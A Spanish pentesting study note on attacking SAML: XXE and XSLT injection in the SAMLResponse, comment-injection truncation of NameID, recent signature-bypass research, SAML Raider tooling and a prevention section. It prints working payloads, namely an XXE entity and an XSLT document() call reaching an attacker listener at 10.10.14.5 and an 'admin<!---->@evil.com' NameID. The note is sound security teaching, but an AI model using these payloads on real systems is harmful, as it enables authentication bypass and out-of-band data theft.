---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - Authentication
  - SAML
Fecha de actualización: 2026-06-23
Nota previa: "[[13 - Ataque de envoltura de firma XML (XSW)]]"
Nota siguiente:
Area: "[[Authentication Avanzado.base|Authentication Avanzado]]"
---
---

SAML es XML, y eso abre una segunda superficie además de los [[12 - Ataque de exclusión de firma SAML|ataques de firma]]: <mark style="background: #ADCCFFA6;">todo lo que afecta a un parser XML mal configurado aplica a la `SAMLResponse`.</mark> Las dos clases principales son `XXE` y `XSLT injection`. Y, por fin, el tooling que automatiza todo el módulo.

# XXE en la SAMLResponse

Si el SP usa un parser XML que resuelve entidades externas, la `SAMLResponse` es un vector de [[14 - Introducción a XXE|XXE]] directo. Inyectas la declaración `DOCTYPE` al principio del XML decodificado:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://10.10.14.5:8000"> %xxe; ]>
<samlp:Response> [...] </samlp:Response>
```

Re-codificas (Base64 → URL-encode) y envías. Una conexión entrante a tu listener confirma el XXE:

```shell-session
$ nc -lnvp 8000
connect to [10.10.14.5] from 172.17.0.2 ...
GET / HTTP/1.1
```

<mark style="background: #FFB86CA6;">Suele ser ciego</mark> (la salida no se refleja), así que la exfiltración requiere las técnicas OOB de [[14 - Introducción a XXE|XXE blind]] (entidades parámetro externas, exfiltración por DNS/HTTP).

# XSLT server-side injection

El mismo parser puede ser vulnerable a [[00 - Inyección XSLT|XSLT injection]] si procesa transformaciones. Un stylesheet malicioso fuerza una petición saliente (o lectura de ficheros):

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('http://10.10.14.5:8000/')"/>
  </xsl:template>
</xsl:stylesheet>
```

> [!warning]+ Inyecta también en ds:Transform
> Si el payload XSLT suelto no dispara, prueba a inyectarlo en el nodo <mark style="background: #FFB86CA6;">`ds:Transform`</mark> de una `SAMLResponse` **válida**. Algunos SP solo procesan las transformaciones XSLT durante la verificación de la firma, así que el payload únicamente se ejecuta si la respuesta contiene información de autenticación válida. Que el SP rechace tu request por SAML inválido **no** significa que no sea vulnerable — la conexión OOB puede llegar igual.

# Inyección por canonicalización XML (comment injection)

Una clase distinta del [[13 - Ataque de envoltura de firma XML (XSW)|XSW]]: no inyecta assertions, abusa de la **canonicalización** (C14N). Insertando un comentario XML dentro del `NameID`:

```xml
<saml:NameID>admin<!---->@evil.com</saml:NameID>
```

<mark style="background: #FFB86CA6;">la C14N elimina el comentario antes de verificar la firma (que sigue válida), pero el parser de la app lee solo el primer text-node y **trunca** el identificador a `admin`</mark> → te autenticas como ese usuario. Golpeó a Duo, Okta, OneLogin y Shibboleth (CVE-2018-0114 y familia). Es ortogonal al XSW: pruébalo aunque el wrapping falle.

> [!important]+ The Fragile Lock (Fedotkin, Black Hat EU 2025): dos bypass de firma más potentes que el comment injection
> El paper [*The Fragile Lock*](https://portswigger.net/research/the-fragile-lock) (Zakhar Fedotkin, dic 2025) reactualizó el ataque a la firma SAML con dos técnicas que **no** requieren XSW ni comentarios:
> - **Void Canonicalization**: declara un namespace con URI **relativa** (`xmlns:ns="1"`); `libxml2` no la resuelve al canonicalizar y devuelve **cadena vacía** en vez de fallar. Como el `SignatureValue` se calcula sobre el `SignedInfo` canonicalizado, una firma precalculada para "cadena vacía" valida **cualquier** assertion — Fedotkin lo llama *Golden SAML Response*.
> - **Inconsistencia de parsers**: atributos duplicados con distinto namespace (`ID` vs `samlp:ID`) se resuelven distinto en el verificador de firma y en la lógica de negocio (REXML vs Nokogiri en Ruby-SAML) → firman un valor y leen otro.
> - Afecta a **Ruby-SAML (< 1.18.0)**, PHP-SAML y `xmlseclibs` (fix 3.1.4); demo contra GitLab EE 17.8.4. Es el bypass SAML más moderno disponible hoy.

# El tooling: SAML Raider

Hacer todo esto a mano (decodificar, editar XML, recodificar) es tedioso y propenso a error. <mark style="background: #FFB86CA6;">[`SAML Raider`](https://github.com/CompassSecurity/SAMLRaider)</mark> es la extensión de Burp que lo automatiza:

| Función | Qué hace |
| - | - |
| `SAML Message Info` | Decodifica y muestra el XML, issuer, algoritmo de firma |
| `Remove Signatures` | [[12 - Ataque de exclusión de firma SAML\|Exclusión de firma]] con un clic |
| XXE / XSLT | Inyecta los payloads de esta nota |
| Signature Wrapping | Las **8 variantes** de [[13 - Ataque de envoltura de firma XML (XSW)\|XSW]] automatizadas |
| Parser differentials | v2.4.0 detecta discrepancias parser-verificación (la generalización moderna del XSW, p. ej. CVE-2025-23369) |
| Gestión de certificados | Clona/genera certs para re-firmar assertions |

Se instala desde `Extensions > BApp Store`, resalta las peticiones con SAML y añade una pestaña en Repeater. Seleccionas el ataque, reenvías, y SAML Raider recodifica por ti. <mark style="background: #8000E1A6;">Es la diferencia entre probar una variante XSW a mano y probar las ocho en un minuto.</mark>

> [!success]+ Flujo de auditoría SAML
> 1. Captura el `SAMLResponse` → SAML Raider (`SAML Message Info`) para leer el XML.
> 2. ¿Manipulación + `Remove Signatures` autentica? → exclusión de firma.
> 3. Si exige firma → probar las 8 variantes de XSW.
> 4. Inyectar XXE y XSLT (sueltos y en `ds:Transform`) → confirmar con listener OOB.

# Prevención

<mark style="background: #ADCCFFA6;">La regla única: usar una librería SAML establecida y actualizada</mark>, nunca implementar la verificación de firma a mano. Las libs modernas, al día, ya están parcheadas contra exclusión, XSW, XXE y XSLT. El XML del SP debe procesarse con resolución de entidades externas **deshabilitada** y firma obligatoria y completa.

> [!info]+ Fuentes
> - [SAML Raider (Compass Security)](https://github.com/CompassSecurity/SAMLRaider) · [PortSwigger BApp](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)
> - [OWASP — SAML Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html)
